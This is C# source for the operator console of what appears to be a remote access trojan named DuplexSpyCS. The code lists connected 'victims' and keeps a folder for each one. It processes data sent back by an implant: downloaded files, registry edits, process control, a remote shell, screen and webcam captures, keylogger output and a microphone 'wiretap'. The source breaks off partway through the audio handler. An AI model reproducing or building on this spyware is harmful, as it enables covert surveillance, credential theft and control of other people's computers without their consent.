using System.Data;
using System.Data.Entity.Core.Mapping;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace DuplexSpyCS
{
    public partial class frmMain : Form
    {
        public clsTcpListener listener;

        ColorStyleMode color_style = ColorStyleMode.LightMode;

        //SCREEN IMAGE LIST
        ImageList il_screen = new ImageList();
        int screen_width = 0;
        int screen_BigWidth = 0;

        /// <summary>
        /// Store class StreamWriter of file transfer.
        /// </summary>
        public static Dictionary<string, clsFilePacketWriter> g_FilePacketWriter = new Dictionary<string, clsFilePacketWriter>();

        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
        public clsSqlConn m_sqlConn { get; set; }

        public frmMain()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Return a list of victim from listview selected items.
        /// </summary>
        /// <returns></returns>
        private List<clsVictim> fnlsGetSelectedVictims()
        {
            List<clsVictim> lsVictim = new List<clsVictim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                lsVictim.Add(GetVictim(item));

            return lsVictim;
        }

        /// <summary>
        /// Get victims from listview1 and return List object.
        /// </summary>
        /// <returns>clsVictim in List.</returns>
        public List<clsVictim> GetAllVictim()
        {
            List<clsVictim> lsVictim = new List<clsVictim>();
            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.Items)
                    lsVictim.Add(GetVictim(item));
            }));

            return lsVictim;
        }

        public void ColorStyle(ColorStyleMode style, Form f = null)
        {
            Color backcolor = clsGlobal.dic_ColorModeStylee[style]["back"];
            Color forecolor = clsGlobal.dic_ColorModeStylee[style]["fore"];

            List<Form> l_form = new List<Form>();
            if (f == null)
                l_form.AddRange(Application.OpenForms.Cast<Form>());
            else
                l_form.Add(f);

            foreach (Form form in l_form)
            {
                foreach (Control control in form.Controls)
                {
                    if (control is ListView)
                    {
                        ListView lv = (ListView)control;
                        lv.OwnerDraw = true;
                        lv.DrawColumnHeader += (sender, e) =>
                        {
                            using (SolidBrush brush = new SolidBrush(backcolor))
                            {
                                e.Graphics.FillRectangle(brush, e.Bounds);
                            }

                            TextRenderer.DrawText(
                                e.Graphics,
                                e.Header.Text,
                                e.Font,
                                e.Bounds,
                                forecolor,
                                TextFormatFlags.VerticalCenter | TextFormatFlags.Left);

                            using (Pen pen = new Pen(Color.Gray))
                            {
                                e.Graphics.DrawRectangle(pen, e.Bounds);
                            }
                        };
                        lv.DrawItem += (sender, e) =>
                        {
                            e.DrawDefault = true;
                        };
                        lv.DrawSubItem += (sender, e) =>
                        {
                            Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;

                            using (SolidBrush brush = new SolidBrush(backColor))
                            {
                                e.Graphics.FillRectangle(brush, e.Bounds);
                            }

                            e.Graphics.DrawString(e.SubItem.Text, e.Item.Font, Brushes.Black, e.Bounds);
                        };
                    }

                    control.BackColor = backcolor;
                    control.ForeColor = forecolor;
                }
            }
        }

        /// <summary>
        /// Create new portfolio when new victim is onlined.
        /// </summary>
        /// <param name="v">Class Victim</param>
        /// <returns></returns>
        int MakeNewPortfolio(clsVictim v)
        {
            try
            {
                string dir = Path.Combine(Application.StartupPath, "Victim");
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                dir = Path.Combine(dir, v.ID);
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    string[] dirs =
                    {
                        "Downloads",
                        "Monitor",
                        "Webcam",
                    };

                    string[] files =
                    {
                        "setting.ini",
                    };

                    foreach (string d in dirs)
                    {
                        string tmp_dir = Path.Combine(dir, d);
                        if (!Directory.Exists(tmp_dir))
                            Directory.CreateDirectory(tmp_dir);
                    }

                    foreach (string file in files)
                    {
                        string tmp_file = Path.Combine(dir, file);
                        if (!File.Exists(tmp_file))
                            File.CreateText(tmp_file).Close();
                    }
                }
                v.dir_victim = dir;

                return 1;
            }
            catch (Exception ex)
            {
                return -1;
            }
        }

        /// <summary>
        /// Process function data from victim.
        /// </summary>
        /// <param name="l">Class Listener</param>
        /// <param name="v">Class Victim</param>
        /// <param name="buffer">Payload</param>
        /// <param name="rec">Buffer length</param>
        public void fnReceived(clsListener l, clsVictim v, List<string> cmd)
        {
            try
            {
                #region Information

                if (cmd[0] == "info")
                {
                    Invoke(new Action(() =>
                    {
                        string online_id = cmd[1];
                        ListViewItem x = listView1.FindItemWithText(online_id);
                        if (x == null) //NEW VICTIM
                        {
                            v.ID = online_id;
                            ListViewItem item = new ListViewItem(""); //Screen
                            item.SubItems.Add(online_id); //Online ID
                            item.SubItems.Add(cmd[2]); //Username
                            item.SubItems.Add(v.socket.RemoteEndPoint.ToString()); //Remote IP Address
                            item.SubItems.Add(cmd[3]); //Is Admin?
                            item.SubItems.Add(cmd[4]); //OS
                            for (int i = 5; i < 9; i++)
                                item.SubItems.Add(cmd[i]);
                            item.SubItems.Add(clsCrypto.b64D2Str(cmd[9]));
                            item.Tag = v;
                            item.ImageKey = v.ID;

                            v.remoteOS = cmd[4];
                            v.ID = online_id;

                            listView1.Items.Add(item);
                            ListViewItem k = listView2.FindItemWithText(online_id);
                            if (k != null)
                                GetVictim(k).Disconnect();

                            MakeNewPortfolio(v);

                            clsStore.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
                            clsStore.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
                        }
                        else
                        {
                            x.SubItems[6].Text = v.latency_time.ToString() + " ms";
                            x.SubItems[7].Text = cmd[6];
                            x.SubItems[10].Text = clsCrypto.b64D2Str(cmd[9]);

                            int width = 0;
                            Invoke(new Action(() => width = listView1.Columns[0].Width));
                            if (il_screen.Images.ContainsKey(v.ID))
                                il_screen.Images.RemoveByKey(v.ID);

                            if (width > 256)
                                width = 255;

                            if (width < 25)
                                width = 25;

                            il_screen.ImageSize = new Size(width, width);
                            Image img = clsTools.Base64ToImage(cmd[10]);
                            Bitmap bmp = new Bitmap(img, new Size(255, 255));
                            il_screen.Images.Add(v.ID, bmp);
                            v.img_LastDesktop = bmp;

                            Invoke(new Action(() =>
                            {
                                List<ListViewItem> lsItem = new List<ListViewItem>();
                                foreach (ListViewItem item in listView1.Items)
                                {
                                    if (item.SubItems[1].Text == online_id)
                                        lsItem.Add(item);
                                }

                                if (lsItem.Count > 1)
                                {
                                    for (int i = 1; i < lsItem.Count; i++)
                                        listView1.Items.Remove(lsItem[i]);
                                }
                            }));
                        }
                    }));
                }

                #endregion
                #region Details

                else if (cmd[0] == "detail")
                {
                    if (cmd[1] == "client")
                    {
                        frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(v);
                        if (f == null)
                            return;

                        if (cmd[2] == "info")
                        {
                            string szPayload = cmd[3];
                            ClientConfig config = new ClientConfig();
                            foreach (string item in szPayload.Split(';'))
                            {
                                string[] split = item.Split(':');
                                switch (split[0])
                                {
                                    case "ID":
                                        config.szOnlineID = split[1];
                                        break;
                                    case "bAntiProc":
                                        config.bKillProcess = split[1] == "1";
                                        break;
                                    case "lsAntiProc":
                                        config.ls_szKillProcess = split[1].Split(',').ToList();
                                        break;
                                    case "dwRetry":
                                        config.dwRetry = int.Parse(split[1]);
                                        break;
                                    case "dwSendInfo":
                                        config.dwSendInfo = int.Parse(split[1]);
                                        break;
                                    case "dwTimeout":
                                        config.dwTimeout = int.Parse(split[1]);
                                        break;
                                }
                            }

                            f.ShowConfig(config);
                        }
                    }
                    else if (cmd[1] == "pc")
                    {
                        frmInfo f = clsTools.fnFindForm<frmInfo>(v);
                        if (f == null)
                            return;

                        if (cmd[2] == "info")
                        {
                            if (cmd[3] == "basic")
                            {
                                f.ShowInfo(clsCrypto.b64D2Str(cmd[4]));
                            }
                            else if (cmd[3] == "patch")
                            {
                                DataTable dt = new DataTable();
                                string szCols = cmd[4];
                                string szRows = cmd[5];

                                foreach (string szCol in szCols.Split(','))
                                    dt.Columns.Add(new DataColumn(szCol));

                                foreach (string szRow in szRows.Split(";"))
                                {
                                    DataRow dr = dt.NewRow();
                                    string[] aVals = szRow.Split(",");
                                    for (int i = 0; i < aVals.Length; i++)
                                        dr[dt.Columns[i].ColumnName] = aVals[i];

                                    dt.Rows.Add(dr);
                                }

                                f.ShowPatch(dt);
                            }
                        }
                    }
                }

                #endregion
                #region FileMgr

                else if (cmd[0] == "file")
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    frmFileTransferState ft = (frmFileTransferState)clsTools.GetFormByVictim(v, Function.TransferFileState);
                    if (f == null && ft == null)
                    {
                        return;
                    }

                    if (cmd[1] == "init")
                    {
                        f.FileInit(cmd[2], cmd[3], cmd[4], cmd[5]);
                    }
                    else if (cmd[1] == "sd")
                    {
                        if (cmd[2] == "error")
                        {
                            MessageBox.Show(clsCrypto.b64D2Str(cmd[3]), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        int nTotalDir = int.Parse(cmd[5]);
                        int nTotalFile = int.Parse(cmd[6]);

                        f.File_AddItems(cmd[2], cmd[3], cmd[4], nTotalDir, nTotalFile);
                    }
                    else if (cmd[1] == "goto")
                    {
                        int code = int.Parse(cmd[2]);
                        string msg = clsCrypto.b64D2Str(cmd[3]);

                        f.FileGoto(code, msg);
                    }
                    else if (cmd[1] == "read")
                    {
                        f.File_Read(cmd[2], cmd[3], cmd[4]);
                    }
                    else if (cmd[1] == "write")
                    {
                        f.File_Write(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "uf") //UPLOAD FILE
                    {
                        frmFileTransferState f_state = (frmFileTransferState)clsTools.GetFormByVictim(v, Function.TransferFileState);
                        if (f_state == null || f_state.transfer_type != TransferFileType.Upload)
                        {
                            f_state = null;
                            return;
                        }

                        if (cmd[2] == "state")
                        {
                            string file = clsCrypto.b64D2Str(cmd[3]);
                            string percentage = cmd[4];

                            if (f_state != null)
                            {
                                f_state.UpdateState(file, percentage);
                            }
                        }
                        else if (cmd[2] == "err") //ERROR
                        {
                            if (cmd[3] == "all") //STOP ALL
                            {

                            }
                            else if (cmd[3] == "one") //SKIP SPECIFIED
                            {
                                string file = clsCrypto.b64D2Str(cmd[4]);
                                string msg = clsCrypto.b64D2Str(cmd[5]);
                                if (f_state != null)
                                {
                                    f_state.UpdateState(file, msg);
                                }
                            }
                        }
                        else if (cmd[2] == "stop") //NOT CAUSED BY ERROR
                        {

                        }
                    }
                    else if (cmd[1] == "df") //DOWNLOAD FILE
                    {
                        if (cmd[2] == "recv")
                        {
                            string remote_file = clsCrypto.b64D2Str(cmd[3]); //THIS IS THE REMOTE FILE PATH, WE NEED TO PROCESS IT, SAVE IT INTO VICTIM FOLDER
                            string tgt_file = Path.Combine(new string[] { v.dir_victim, "Downloads", Path.GetFileName(remote_file) });
                            long file_len = long.Parse(cmd[4]);
                            int offset = int.Parse(cmd[5]);
                            byte[] file_buffer = Convert.FromBase64String(cmd[6]);

                            if (!g_FilePacketWriter.ContainsKey(tgt_file))
                                g_FilePacketWriter.Add(tgt_file, new clsFilePacketWriter(tgt_file, remote_file, file_len, v));

                            clsFilePacketWriter writer = g_FilePacketWriter[tgt_file];
                            writer.EnqueuePacket(offset, file_buffer);
                        }
                        else if (cmd[2] == "err") //ERROR
                        {
                            if (cmd[3] == "all") //STOP ALL
                            {

                            }
                            else if (cmd[3] == "one") //SKIP ALL
                            {

                            }
                        }
                        else if (cmd[2] == "stop") //NOT CAUSED BY ERROR
                        {

                        }
                    }
                    else if (cmd[1] == "img")
                    {
                        f.File_ShowImage(cmd[2]);
                    }
                    else if (cmd[1] == "new")
                    {
                        if (cmd[2] == "folder")
                        {
                            string code = cmd[3];

                            if (cmd[3] == "1")
                            {
                                f.fileLV_Refresh();
                            }
                            else
                            {
                                string msg = clsCrypto.b64D2Str(cmd[4]);
                                MessageBox.Show(msg, "Error - New Folder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                    else if (cmd[1] == "paste")
                    {
                        frmFilePaste _f = (frmFilePaste)clsTools.GetFormByVictim(v, Function.FilePaste);
                        if (_f == null)
                            return;
                        else
                            Invoke(new Action(() => _f.Activate()));

                        List<string[]> func(string data)
                        {
                            return data.Split(',').Select(x => clsCrypto.b64D2Str(x).Split('|')).Select(x => new string[]
                            {
                                x[0],
                                x[1],
                                clsCrypto.b64D2Str(x[2]),
                                clsCrypto.b64D2Str(x[3]),
                            }).ToList();
                        }

                        List<string[]> entries = func(cmd[2]);

                        _f.ShowResult(entries);
                    }
                    else if (cmd[1] == "del")
                    {
                        frmFileDelState _f = (frmFileDelState)clsTools.GetFormByVictim(v, Function.FileDelState);
                        if (_f == null)
                            return;
                        else
                            Invoke(new Action(() => _f.Activate()));

                        List<string[]> func(string data)
                        {
                            return data.Split(',').Select(x => x.Split(';')).Select(x => new string[]
                            {
                                x[0], //CODE
                                clsCrypto.b64D2Str(x[1]), //PATH
                                string.IsNullOrEmpty(x[2]) ? string.Empty : clsCrypto.b64D2Str(x[2]) //MESSAGE
                            }).ToList();
                        }

                        List<string[]> folders = func(cmd[2]);
                        List<string[]> files = func(cmd[3]);

                        _f.ShowDelState(folders, files);
                    }
                    else if (cmd[1] == "zip")
                    {
                        frmFileArchive af = (frmFileArchive)clsTools.GetFormByVictim(v, Function.FileArchive);
                        if (af == null)
                            return;

                        List<string[]> dInfo = null;
                        List<string[]> fInfo = null;

                        if (!string.IsNullOrEmpty(cmd[2]))
                            dInfo = cmd[2].Split(',')
                                .Select(x => clsCrypto.b64D2Str(x))
                                .Select(x => x.Split('|'))
                                .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                                .ToList();

                        if (!string.IsNullOrEmpty(cmd[3]))
                            fInfo = cmd[3].Split(',')
                                .Select(x => clsCrypto.b64D2Str(x))
                                .Select(x => x.Split('|'))
                                .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                                .ToList();

                        af.ShowState(ArchiveAction.Compress, dInfo, fInfo, cmd[4]);
                    }
                    else if (cmd[1] == "unzip")
                    {
                        frmFileArchive af = (frmFileArchive)clsTools.GetFormByVictim(v, Function.FileArchive);
                        if (af == null)
                            return;

                        List<string[]> aInfo = cmd[2].Split(',')
                            .Select(x => clsCrypto.b64D2Str(x))
                            .Select(x => x.Split('|'))
                            .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                            .ToList();

                        af.ShowState(ArchiveAction.Extract, aInfo, null);
                    }
                    else if (cmd[1] == "find")
                    {
                        frmFileFind ff = clsTools.fnFindForm<frmFileFind>(v);
                        if (ff == null)
                            return;

                        List<(string, string, string)> results = cmd[2].Split(';')
                            .Select(x => x.Split(','))
                            .Select(x => new string[] { x[0], clsCrypto.b64D2Str(x[1]) })
                            .Select(x => (Path.GetFileName(x[1]), x[0] == "d" ? "Directory" : "File", x[1]))
                            .ToList();

                        List<(string, string, string)> lsFolder = results.Where(x => x.Item2 == "Directory").ToList();
                        List<(string, string, string)> lsFile = results.Where(x => x.Item2 != "Directory").ToList();

                        ff.ShowFindResult(lsFolder, lsFile);
                    }
                    else if (cmd[1] == "wget")
                    {
                        string szUrl = clsCrypto.b64D2Str(cmd[3]);
                        string szSavePath = clsCrypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "progress")
                        {
                            string szPercentage = cmd[5];
                            string szRatio = cmd[6];

                            f.File_WgetUpdate(szUrl, szSavePath, 1, $"{szPercentage} ({szRatio})");
                        }
                        else if (cmd[2] == "status")
                        {
                            int code = int.Parse(cmd[5]);
                            string msg = clsCrypto.b64D2Str(cmd[6]);

                            f.File_WgetUpdate(szUrl, szSavePath, code, msg);
                        }
                    }
                    else if (cmd[1] == "ts")
                    {
                        int nCode = int.Parse(cmd[2]);
                        string szMsg = clsCrypto.b64D2Str(cmd[3]);

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        f.fileLV_Refresh();
                    }
                    else if (cmd[1] == "sc") //ShortCut
                    {
                        int nCode = int.Parse(cmd[2]);
                        string szMsg = clsCrypto.b64D2Str(cmd[3]);

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "File - ShortCut", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        f.fileLV_Refresh();
                    }
                }

                #endregion
                #region TaskMgr

                else if (cmd[0] == "task")
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.TaskInit(cmd[2]);
                    }
                    else if (cmd[1] == "start")
                    {
                        string szFileName = clsCrypto.b64D2Str(cmd[2]);
                        string szArgv = clsCrypto.b64D2Str(cmd[3]);
                        string szWorkDir = clsCrypto.b64D2Str(cmd[4]);
                        int code = int.Parse(cmd[4]);

                        if (code == 0)
                        {
                            string msg = clsCrypto.b64D2Str(cmd[5]);
                            MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            MessageBox.Show($"Start process successfully: {szFileName} {szArgv} at {szWorkDir}");
                        }
                    }
                    else if (cmd[1] == "kill" || cmd[1] == "kd" || cmd[1] == "resume" || cmd[1] == "suspend")
                    {
                        List<string[]> lsResult =
                            cmd[2].Split(';')
                            .Where(x => !string.IsNullOrEmpty(x))
                            .Select(x => x.Split(','))
                            .Select(x => new string[]
                            {
                                x[0],
                                int.Parse(x[1]) == 0 ? clsCrypto.b64D2Str(cmd[2]) : "OK"
                            })
                            .ToList();

                        Invoke(new Action(() =>
                        {
                            frmListView fl = new frmListView(new string[] { "PID", "Result" });
                            fl.Show();
                            fl.ShowInfo(lsResult);
                        }));
                    }
                }

                #endregion
                #region RegEdit

                else if (cmd[0] == "reg") //RegEdit
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.RegInit(cmd[2]);
                    }
                    else if (cmd[1] == "item")
                    {
                        f.Reg_AddItem(cmd[2], cmd[3], cmd[4]);
                    }
                    else if (cmd[1] == "goto")
                    {
                        f.Reg_Goto(clsCrypto.b64D2Str(cmd[2]), cmd[3]);
                    }
                    else if (cmd[1] == "add")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = clsCrypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            f.Reg_RespAddKey(code, msg);
                        }
                        else if (cmd[2] == "val")
                        {
                            f.Reg_RespAddValue(code, msg);
                        }
                    }
                    else if (cmd[1] == "rename")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = clsCrypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            f.Reg_RespKeyRename(code, msg);
                        }
                        else if (cmd[2] == "val")
                        {
                            f.Reg_RespValueRename(code, msg);
                        }
                    }
                    else if (cmd[1] == "del")
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = clsCrypto.b64D2Str(cmd[4]);
                        bool bKey = cmd[2] == "key";

                        switch (code)
                        {
                            case 0:
                                MessageBox.Show(msg, "Error - RegDeleteKey()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                break;
                            case 1:
                                MessageBox.Show($"Delete {(bKey ? "key" : "value")} successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);

                                frmManager f_mgr = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                                if (f_mgr == null)
                                    return;

                                f_mgr.Reg_Refresh();

                                break;
                        }
                    }
                    else if (cmd[1] == "find")
                    {
                        frmRegFind ff = (frmRegFind)clsTools.GetFormByVictim(v, Function.RegFind);
                        if (ff == null)
                            return;

                        List<(string, string)> lsKey = new List<(string, string)>();
                        List<(string, string)> lsVal = new List<(string, string)>();

                        foreach (var x in cmd[2].Split(',').Select(y => y.Split(';')).Select(y => (y[0], clsCrypto.b64D2Str(y[1]), clsCrypto.b64D2Str(y[2]))))
                        {
                            if (x.Item1 == "k")
                                lsKey.Add(("Directory", x.Item2));
                            else
                                lsVal.Add(("Value", x.Item3 + "\\" + x.Item2));
                        }

                        ff.ShowFindResult(lsKey, lsVal);
                    }
                    else if (cmd[1] == "export")
                    {
                        int code = int.Parse(cmd[2]);
                        string msg = clsCrypto.b64D2Str(cmd[3]);
                        string savePath = clsCrypto.b64D2Str(cmd[4]);

                        if (code == 0)
                        {
                            MessageBox.Show(msg, "Reg Export", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            File.WriteAllText(savePath, msg);
                            DialogResult r = MessageBox.Show(
                                "Export successfully: " + savePath + "\n" +
                                "Do you want to open in file explorer ?",
                                "Done",
                                MessageBoxButtons.YesNo,
                                MessageBoxIcon.Question,
                                MessageBoxDefaultButton.Button2
                            );

                            if (r == DialogResult.Yes)
                            {
                                if (string.IsNullOrEmpty(savePath))
                                {
                                    MessageBox.Show("Save path is null!", "Null string", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                    return;
                                }

                                string dir = Path.GetDirectoryName(savePath);
                                //Open in file explorer
                                if (Directory.Exists(dir))
                                    Process.Start("explorer.exe", dir);
                                else
                                    MessageBox.Show("Directory not exist !\n" + dir, "Directory Not found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                        }
                    }
                    else if (cmd[1] == "import")
                    {
                        int code = int.Parse(cmd[2]);
                        string msg = clsCrypto.b64D2Str(cmd[3]);
                        string saveRemotePath = clsCrypto.b64D2Str(cmd[4]);
                    }
                }

                #endregion
                #region ServMgr

                else if (cmd[0] == "serv")
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.ServInit(cmd[2]);
                    }
                }

                #endregion
                #region Connection

                else if (cmd[0] == "conn")
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.ConnInit(cmd[2]);
                    }
                }

                #endregion
                #region WindowMgr

                else if (cmd[0] == "window")
                {
                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        int code = int.Parse(cmd[2]);
                        if (code == 0)
                        {
                            string msg = clsCrypto.b64D2Str(cmd[3]);
                            MessageBox.Show(msg, "Manager - GetWindow Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        List<WindowInfo> lsWindow = new List<WindowInfo>();
                        foreach (string item in cmd[4].Split(';').Where(x => !string.IsNullOrEmpty(x)).ToArray())
                        {
                            string[] split = item.Split(',');

                            Icon iWindow = null;
                            if (split[1] != "?")
                            {
                                byte[] iconBuffer = Convert.FromBase64String(split[1]);
                                using (MemoryStream ms = new MemoryStream(iconBuffer))
                                {
                                    iWindow = new Icon(ms);
                                }
                            }

                            WindowInfo info = new WindowInfo()
                            {
                                szTitle = clsCrypto.b64D2Str(split[0]),
                                iWindow = iWindow,
                                szFilePath = clsCrypto.b64D2Str(split[2]),
                                szProcessName = split[3],
                                nProcessId = int.Parse(split[4]),
                                nHandle = int.Parse(split[5]),
                            };

                            lsWindow.Add(info);
                        }

                        f.WindowInit(lsWindow);
                    }
                    else if (cmd[1] == "shot")
                    {
                        string szhWnd = cmd[2];
                        int code = int.Parse(cmd[3]);
                        if (code == 0)
                        {
                            string msg = clsCrypto.b64D2Str(cmd[4]);
                            MessageBox.Show(msg, "CaptureWindow() error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        Image img = clsTools.Base64ToImage(cmd[5]);
                        f.Window_ShowScreenshot(cmd[2], img);
                    }
                }

                #endregion

                #region System

                else if (cmd[0] == "system")
                {
                    frmSystem f = (frmSystem)clsTools.GetFormByVictim(v, Function.System);
                    if (f == null)
                        return;

                    if (cmd[1] == "app") //APPLICATION
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> apps = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                            f.App_ShowApps(apps);
                        }
                    }
                    else if (cmd[1] == "ev") //ENVIRONMENT VARIABLES
                    {
                        int code = int.Parse(cmd[3]);
                        string msg = clsCrypto.b64D2Str(cmd[4]);

                        if (code == 0)
                        {
                            MessageBox.Show(msg, $"{cmd[0]}.{cmd[1]}.{cmd[2]}", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        if (cmd[2] == "init")
                        {

                            List<(string, EnvironmentVariableTarget, string)> s = cmd[5].Split(';')
                                .Select(x => x.Split(','))
                                .Select(x => (x[0], (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), x[1]), clsCrypto.b64D2Str(x[2])))
                                .ToList();

                            f.EV_ShowEVs(s);
                        }
                        else if (cmd[2] == "set")
                        {

                        }
                    }
                    else if (cmd[1] == "device") //PNP ENTITY
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> devices = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                            f.Device_ShowDevices(devices);
                        }
                        else if (cmd[2] == "info")
                        {
                            int code = int.Parse(cmd[3]);
                            string msg = clsCrypto.b64D2Str(cmd[4]);
                            string payload = cmd[5];

                            List<Tuple<string, string>> lsInfo = new List<Tuple<string, string>>();
                            foreach (string item in payload.Split(',').Where(x => !string.IsNullOrEmpty(x)).ToArray())
                            {
                                string[] split = item.Split(':');
                                lsInfo.Add(new Tuple<string, string>(split[0], split[1]));
                            }

                            f.DeviceShowInfo(lsInfo);
                        }
                    }
                    else if (cmd[1] == "if") //INTERFACE
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> interfaces = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                            f.If_ShowInterface(interfaces);
                        }
                    }
                }

                #endregion
                #region Terminal

                else if (cmd[0] == "shell")
                {
                    frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
                    if (f == null)
                        return;

                    if (cmd[1] == "output" || cmd[1] == "error")
                    {
                        string text = cmd[2];
                        f.WriteOutput(text);
                    }
                    else if (cmd[1] == "tab")
                    {
                        string text = clsCrypto.b64D2Str(cmd[2]);
                        f.ProcessTab(text);
                    }
                }

                #endregion
                #region WMI

                else if (cmd[0] == "wmi")
                {
                    frmWMI f = (frmWMI)clsTools.GetFormByVictim(v, Function.WMI);
                    if (f == null)
                        return;

                    if (cmd[1] == "output")
                    {
                        f.ShowOutput(cmd[2]);
                    }
                    else if (cmd[1] == "error")
                    {
                        MessageBox.Show("WMI error");
                    }
                }

                #endregion
                #region Monitor

                else if (cmd[0] == "desktop")
                {
                    frmDesktop f = clsTools.fnFindForm<frmDesktop>(v);
                    if (f == null)
                        return;
                    if (cmd[1] == "init")
                    {
                        f.Init(cmd[2]);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        f.ShowImage(cmd[2], cmd[3]);
                    }
                }

                #endregion
                #region Webcam

                else if (cmd[0] == "webcam")
                {
                    frmWebcam f = clsTools.fnFindForm<frmWebcam>(v);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        f.Init(cmd[2]);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "snapshot")
                    {
                        f.ShowImage(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "stop")
                    {

                    }
                }

                #endregion
                #region Multi Webcam

                else if (cmd[0] == "mulcam")
                {
                    if (cmd[1] == "start")
                    {
                        string szBase64Image = cmd[2];
                        string szDatetime = cmd[3];
                        v.img_LastWebcam = clsTools.Base64ToImage(szBase64Image);
                    }
                }

                #endregion
                #region Keylogger

                else if (cmd[0] == "keylogger")
                {
                    frmKeyLogger f = (frmKeyLogger)clsTools.GetFormByVictim(v, Function.KeyLogger);
                    if (f == null)
                        return;

                    if (cmd[1] == "read")
                    {
                        f.ShowKeyLogger(cmd[2], cmd[3]);
                    }
                    else if (cmd[1] == "new")
                    {

                    }
                    else if (cmd[1] == "del")
                    {

                    }
                }

                #endregion
                #region Chat

                else if (cmd[0] == "chat")
                {
                    frmChat f = (frmChat)clsTools.GetFormByVictim(v, Function.Chat);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        Invoke(new Action(() =>
                        {
                            f.BringToFront();
                            f.Init();
                        }));
                    }
                    else if (cmd[1] == "msg")
                    {
                        f.ShowMsg(v.ID, clsCrypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "close")
                    {

                    }
                }

                #endregion
                #region Audio

                else if (cmd[0] == "audio")
                {
                    frmAudio f = (frmAudio)clsTools.GetFormByVictim(v, Function.Audio);
                    if (f == null)
                        return;

                    if (cmd[1] == "init")
                    {
                        string szPayloadMic = cmd[2];
                        string szPayloadSys = cmd[3];

                        List<(int, string)> lsMic = szPayloadMic.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), clsCrypto.b64D2Str(x[1]))).ToList();
                        List<(int, string)> lsSys = szPayloadSys.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), clsCrypto.b64D2Str(x[1]))).ToList();

                        f.Init(lsMic, lsSys);
                    }
                    else if (cmd[1] == "update")
                    {
                        if (cmd[2] == "vol") //VOLUME
                        {
                            f.UpdateVolume(float.Parse(cmd[3]));
                        }
                        else if (cmd[2] == "mute")
                        {
                            if (cmd[3] == "mute")
                            {

                            }
                            else if (cmd[3] == "unmute")
                            {

                            }
                            else if (cmd[3] == "disable")
                            {

                            }
                            else if (cmd[3] == "enable")
                            {

                            }
                        }
                    }
                    else if (cmd[1] == "wiretap")
                    {
                        if (cmd[2] == "micro")
                        {
                            if (cmd[3] == "buffer")
                            {
